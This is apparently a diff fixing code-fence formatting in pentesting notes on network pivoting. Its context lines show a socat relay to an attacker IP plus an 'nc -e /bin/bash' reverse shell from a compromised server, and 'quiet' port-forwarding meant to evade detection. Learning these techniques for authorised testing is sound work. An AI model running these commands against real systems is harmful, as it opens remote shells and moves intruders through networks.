@@ -67,7 +67,7 @@ Example ::
 [root@prod-server]# ./socat tcp-l:8000 tcp:10.50.73.2:443 & → listen on  8000 and send traffic to attacker 443
 [root@prod-server]# chmod +x ./nc
 [root@prod-server]# ./nc 127.0.0.1 8000 -e /bin/bash → here we connect to the server 8000 which will direct it to attacker 443
-````
+```
 ### Forwarding PORT NOISY:: 
 compromised server → 172.16.0.5
 target server and port → 172.16.0.10:3306
@@ -80,7 +80,7 @@ reuseaddr → means that the port stays open after the connection is made to it.
 
 ### Forwarding Port Quiet ::
 Previous techinque opens up a port in compromised server which can be noisy and detectable
-``
+```
 Attacking machine → socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
 ```
 open up two port 8001 and 8000 creating a local port relay what goes in to one comes out into another. For this reason port 8000 has fork and reuseaddr to create more than one connection using the port forward
